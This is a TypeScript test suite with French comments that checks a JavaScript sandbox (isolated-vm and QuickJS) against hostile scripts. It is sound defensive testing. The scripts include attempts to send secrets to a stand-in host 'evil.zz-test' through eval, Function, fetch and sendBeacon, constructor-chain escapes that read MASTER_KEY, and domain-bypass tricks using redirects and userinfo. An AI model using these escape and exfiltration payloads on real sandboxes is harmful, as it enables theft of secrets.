// SPDX-License-Identifier: AGPL-3.0-only
// assert_sandbox (INV7, tâche 1.5, 08 §3 et §7, 15 §7) : suite hostile partagée. Chaque tentative échoue, le processus
// enfant est tué en moins de 2 s, `sandbox_violation` est journalisé, l'enfant ne voit ni MASTER_KEY ni DATABASE_URL.
// La même suite tourne sur le moteur isolated-vm et sur l'adaptateur QuickJS (spike) sans changer un pont.
// Tout reste en boucle locale : « api.zz-test » et « evil.zz-test » résolvent vers 127.0.0.1 (résolveur injecté).
import { existsSync, readFileSync } from 'node:fs';
import { createServer, type Server, type ServerResponse } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pino } from 'pino';
import { afterAll, beforeAll, describe, expect, test } from 'vitest';
import type { SandboxEngineId, SandboxLimits, SandboxResult } from '@runtime/core';
import { createSsrfPolicy, SsrfGuard } from '@runtime/core/net';
import { createSandboxBridges } from './bridges.js';
import { ProcessSandboxEngine, unexpectedEnvKeys } from './engine.js';

const KILL_BUDGET_MS = 2000;
const CANARY = 'zz_test_canary_master_key_sandbox';

type Counter = { server: Server; port: number; hits: number; upgrades: number; paths: string[] };

async function counter(handler?: (path: string, res: ServerResponse) => boolean): Promise<Counter> {
  const c: Counter = { server: createServer(), port: 0, hits: 0, upgrades: 0, paths: [] };
  c.server.on('request', (req, res) => {
    c.hits += 1;
    c.paths.push(req.url ?? '');
    if (handler?.(req.url ?? '', res) === true) return;
    res.writeHead(200, { 'content-type': 'application/json', 'set-cookie': 'zz_test_session=1' }).end('{"ok":true}');
  });
  c.server.on('upgrade', (_req, socket) => {
    c.upgrades += 1;
    socket.destroy();
  });
  c.server.on('connection', () => void 0);
  await new Promise<void>((resolve) => c.server.listen(0, '127.0.0.1', resolve));
  c.port = (c.server.address() as AddressInfo).port;
  return c;
}

let api: Counter;
let evil: Counter;
let guard: SsrfGuard;
const saved = { MASTER_KEY: process.env.MASTER_KEY, DATABASE_URL: process.env.DATABASE_URL };

beforeAll(async () => {
  evil = await counter();
  api = await counter((path, res) => {
    if (path === '/redirect-evil') {
      res.writeHead(302, { location: `http://evil.zz-test:${evil.port}/stolen` }).end();
      return true;
    }
    return false;
  });
  guard = new SsrfGuard({
    policy: createSsrfPolicy({ testAllowPrivate: true }),
    resolver: async () => [{ address: '127.0.0.1', family: 4 }],
  });
  // Le parent détient des secrets : l'enfant ne doit jamais les voir.
  process.env.MASTER_KEY = CANARY;
  process.env.DATABASE_URL = 'postgres://zz_test:zz_test@127.0.0.1/zz_test';
});

afterAll(async () => {
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  for (const c of [api, evil]) {
    c.server.closeAllConnections();
    await new Promise((r) => c.server.close(r));
  }
});

type Run = SandboxResult & { logs: Record<string, unknown>[]; items: unknown[]; pid?: number; envKeys?: readonly string[]; environ?: string };

function alive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

async function run(engineId: SandboxEngineId, code: string, limits: Partial<SandboxLimits> = {}): Promise<Run> {
  const logs: Record<string, unknown>[] = [];
  const logger = pino({ level: 'info' }, { write: (s: string) => void logs.push(JSON.parse(s) as Record<string, unknown>) });
  let pid: number | undefined;
  let envKeys: readonly string[] | undefined;
  let environ: string | undefined;
  const engine = new ProcessSandboxEngine({
    engine: engineId,
    onChildReady: (info) => {
      pid = info.pid;
      envKeys = info.envKeys;
      // Linux : lecture directe de l'environnement du processus, indépendante de ce que l'enfant déclare.
      if (existsSync(`/proc/${info.pid}/environ`)) environ = readFileSync(`/proc/${info.pid}/environ`, 'utf8');
    },
  });
  const { bridges, items } = createSandboxBridges({ allowedDomains: ['api.zz-test'], guard, logger });
  const result = await engine.run(code, bridges, { timeoutMs: 1000, memoryMb: 64, ...limits }, { input: { secret: 'zz_test_input' } });
  return { ...result, logs, items, pid, envKeys, environ };
}

const violationLogged = (r: Run, reason?: string) =>
  r.logs.some((l) => l.event === 'sandbox_violation' && (reason === undefined || l.reason === reason));

function expectKilledFast(r: Run, timeoutMs: number) {
  expect(r.killed).toBe(true);
  expect(r.killLatencyMs).toBeDefined();
  expect(r.killLatencyMs as number).toBeLessThan(KILL_BUDGET_MS);
  expect(r.durationMs).toBeLessThan(timeoutMs + KILL_BUDGET_MS + 1000); // + démarrage de l'enfant
  if (r.pid !== undefined) expect(alive(r.pid)).toBe(false);
}

const ENGINES: SandboxEngineId[] = ['isolated-vm', 'quickjs'];

describe.each(ENGINES)('assert_sandbox — %s', (engineId) => {
  test('contrôle : un script légitime passe (ponts fetch, log, emit)', async () => {
    const before = api.hits;
    const r = await run(engineId, `
      const res = await ctx.fetch('http://api.zz-test:${api.port}/items');
      ctx.log('statut', res.status);
      ctx.emit({ n: 1 });
      return { status: res.status, body: await res.json(), cookie: res.headers['set-cookie'] ?? null, input };`);
    expect(r.outcome).toBe('ok');
    expect(r.value).toEqual({ status: 200, body: { ok: true }, cookie: null, input: { secret: 'zz_test_input' } });
    expect(r.items).toEqual([{ n: 1 }]);
    expect(api.hits).toBe(before + 1);
    expect(r.violations).toEqual([]);
  });

  test('1. disque : require/process/import échouent, aucun fichier écrit', async () => {
    const file = join(tmpdir(), `zz_test_sandbox_${engineId}_${process.pid}`);
    const r1 = await run(engineId, `require('fs').writeFileSync(${JSON.stringify(file)}, 'x'); return 1;`);
    const r2 = await run(engineId, `process.binding('fs'); return 1;`);
    const r3 = await run(engineId, `const fs = await import('node:fs'); fs.writeFileSync(${JSON.stringify(file)}, 'x'); return 1;`);
    for (const r of [r1, r2, r3]) expect(r.outcome).not.toBe('ok');
    expect(existsSync(file)).toBe(false);
    expect(violationLogged(r1, 'forbidden_global')).toBe(true);
    expect(violationLogged(r2, 'forbidden_global')).toBe(true);
  });

  test('2. fetch hors domaine (direct, redirection, IP, userinfo) : refusé, 0 requête vers le domaine piège', async () => {
    const before = evil.hits;
    const r1 = await run(engineId, `await ctx.fetch('http://evil.zz-test:${evil.port}/x'); return 1;`);
    const r2 = await run(engineId, `await ctx.fetch('http://api.zz-test:${api.port}/redirect-evil'); return 1;`);
    const r3 = await run(engineId, `await ctx.fetch('http://127.0.0.1:${evil.port}/x'); return 1;`);
    const r4 = await run(engineId, `await ctx.fetch('http://api.zz-test@evil.zz-test:${evil.port}/x'); return 1;`);
    const r5 = await run(engineId, `try { await ctx.fetch('http://evil.zz-test:${evil.port}/x'); } catch (e) {} return 'rattrapé';`);
    for (const r of [r1, r2, r3, r4, r5]) {
      expect(r.outcome).toBe('violation');
      expect(violationLogged(r)).toBe(true);
    }
    expect(violationLogged(r1, 'domain_not_allowed')).toBe(true);
    expect(violationLogged(r2, 'domain_not_allowed')).toBe(true);
    expect(evil.hits).toBe(before);
  });

  test('3. evaluate qui exfiltre (eval, Function, objets exposés, fetch global, sendBeacon) : échoue', async () => {
    const before = evil.hits;
    const target = `http://evil.zz-test:${evil.port}/exfil?d=`;
    const attempts = [
      `eval("ctx.fetch('${target}' + JSON.stringify(input))"); await new Promise((r) => r()); return 1;`,
      `await new Function('ctx', 'input', "return ctx.fetch('${target}' + input.secret)")(ctx, input); return 1;`,
      `await fetch('${target}' + input.secret); return 1;`,
      `navigator.sendBeacon('${target}', input.secret); return 1;`,
      `const g = ctx.log.constructor('return this')(); return typeof g.require;`,
      `return ctx.log.constructor.constructor('return process')().env.MASTER_KEY;`,
    ];
    for (const code of attempts) {
      const r = await run(engineId, code);
      expect(r.outcome, code).not.toBe('ok');
      expect(violationLogged(r), code).toBe(true);
      expect(JSON.stringify(r)).not.toContain(CANARY);
    }
    expect(evil.hits).toBe(before);
  });

  test('4. WebSocket (et EventSource) vers un domaine hors API : échoue, 0 connexion', async () => {
    const before = evil.upgrades + evil.hits;
    const r1 = await run(engineId, `new WebSocket('ws://evil.zz-test:${evil.port}/'); return 1;`);
    const r2 = await run(engineId, `new EventSource('http://evil.zz-test:${evil.port}/'); return 1;`);
    for (const r of [r1, r2]) {
      expect(r.outcome).toBe('violation');
      expect(violationLogged(r, 'forbidden_global')).toBe(true);
    }
    expect(evil.upgrades + evil.hits).toBe(before);
  });

  test('5. boucle infinie (synchrone, après un await, répétée) : enfant tué en < 2 s', async () => {
    const loops = ['while (true) {}', `await ctx.fetch('http://api.zz-test:${api.port}/'); for (;;) {}`, 'for (let i = 0; i < 3; i++) { try { while (true) {} } catch (e) {} } while (true) {}'];
    for (const code of loops) {
      const r = await run(engineId, code, { timeoutMs: 500 });
      expect(r.outcome, code).toBe('timeout');
      expectKilledFast(r, 500);
      expect(violationLogged(r, 'time_limit')).toBe(true);
    }
  });

  test('6. mémoire (allocation de 1 Go) : échoue, enfant tué en < 2 s', async () => {
    const code =
      engineId === 'quickjs'
        ? `let s = 'x'; const keep = []; while (true) { s = s + s; keep.push(s); }`
        : `const keep = []; for (let i = 0; i < 1024; i++) keep.push(new Uint8Array(1024 * 1024).fill(1)); const big = []; while (true) big.push({ a: Math.random(), b: [1, 2, 3] }); return keep.length;`;
    const r = await run(engineId, code, { timeoutMs: 10_000, memoryMb: 64, processMemoryMb: 512 });
    expect(r.outcome).toBe('memory');
    expectKilledFast(r, 10_000);
    expect(violationLogged(r, 'memory_limit')).toBe(true);
  });

  test('environnement de l’enfant : ni MASTER_KEY ni DATABASE_URL, lecture refusée', async () => {
    const r = await run(engineId, `return process.env.MASTER_KEY;`);
    expect(r.outcome).toBe('violation');
    expect(violationLogged(r, 'forbidden_global')).toBe(true);
    expect(r.envKeys).toBeDefined();
    expect(r.envKeys).not.toContain('MASTER_KEY');
    expect(r.envKeys).not.toContain('DATABASE_URL');
    expect(unexpectedEnvKeys(r.envKeys ?? ['?'])).toEqual([]);
    if (r.environ !== undefined) expect(r.environ).not.toContain(CANARY);
    expect(JSON.stringify(r)).not.toContain(CANARY);
  });

  test('ponts fuzzés depuis l’isolat (getters, toJSON qui lève, tailles extrêmes) : aucun plantage', async () => {
    const r = await run(engineId, `
      const out = [];
      const tries = [
        () => ctx.fetch({ toString() { throw new Error('x'); } }),
        () => ctx.fetch('http://api.zz-test:${api.port}/', { headers: { get a() { throw new Error('getter'); } } }),
        () => ctx.fetch('http://api.zz-test:${api.port}/', { method: 'POST', body: 'x'.repeat(2 * 1024 * 1024) }),
        () => ctx.fetch('http://api.zz-test:${api.port}/', { headers: { 'x-a': 1 } }),
        () => ctx.fetch('http://api.zz-test:${api.port}/', { toJSON() { throw new Error('toJSON'); } }),
        () => ctx.emit({ toJSON() { return undefined; } }),
        () => ctx.emit(() => 1),
        () => ctx.log(Symbol('s')),
        () => ctx.emit('x'.repeat(2 * 1024 * 1024)),
      ];
      for (const t of tries) { try { await t(); out.push('ok'); } catch (e) { out.push(String(e && e.message).slice(0, 40)); } }
      return out;`, { timeoutMs: 5000 });
    expect(r.outcome).not.toBe('crashed');
    expect(r.outcome).not.toBe('timeout');
  });
});

describe('assert_sandbox — mesure RSS (15 §7)', () => {
  test('100 exécutions hostiles : aucune ne réussit, aucun enfant survivant, pas de fuite côté parent', async () => {
    const hostile = [
      `require('fs'); return 1;`,
      `await ctx.fetch('http://evil.zz-test:${evil.port}/'); return 1;`,
      `eval("ctx.fetch('http://evil.zz-test:${evil.port}/?d=' + input.secret)"); return 1;`,
      `new WebSocket('ws://evil.zz-test:${evil.port}/'); return 1;`,
      `while (true) {}`,
      `const keep = []; while (true) keep.push(new Uint8Array(4 * 1024 * 1024).fill(1));`,
    ];
    const evilBefore = evil.hits + evil.upgrades;
    const pids: number[] = [];
    const peaks: number[] = [];
    const listeners = process.listenerCount('exit');
    const rssAt: number[] = [];
    for (let i = 0; i < 100; i++) {
      const r = await run('isolated-vm', hostile[i % hostile.length] as string, { timeoutMs: 300, memoryMb: 64, processMemoryMb: 384 });
      expect(r.outcome, `run ${i}`).not.toBe('ok');
      expect(violationLogged(r), `run ${i} ${JSON.stringify({ ...r, logs: undefined })}`).toBe(true);
      if (r.killed) expect(r.killLatencyMs as number).toBeLessThan(KILL_BUDGET_MS);
      if (r.pid !== undefined) pids.push(r.pid);
      if (r.peakRssMb !== undefined) peaks.push(r.peakRssMb);
      if (i === 9 || i === 99) rssAt.push(process.memoryUsage().rss);
    }
    expect(pids.length).toBe(100);
    expect(pids.filter(alive)).toEqual([]);
    expect(evil.hits + evil.upgrades).toBe(evilBefore);
    expect(process.listenerCount('exit')).toBe(listeners);
    // RSS de l'enfant bornée par le plafond processus ; RSS du parent stable entre le 10e et le 100e run.
    expect(Math.max(...peaks)).toBeLessThanOrEqual(384 + 64);
    const growthMb = ((rssAt[1] as number) - (rssAt[0] as number)) / 1048576;
    console.log(`RSS parent : ${Math.round((rssAt[0] as number) / 1048576)} → ${Math.round((rssAt[1] as number) / 1048576)} Mo ; RSS enfant max ${Math.max(...peaks)} Mo`);
    expect(growthMb).toBeLessThan(64);
  }, 180_000);
});
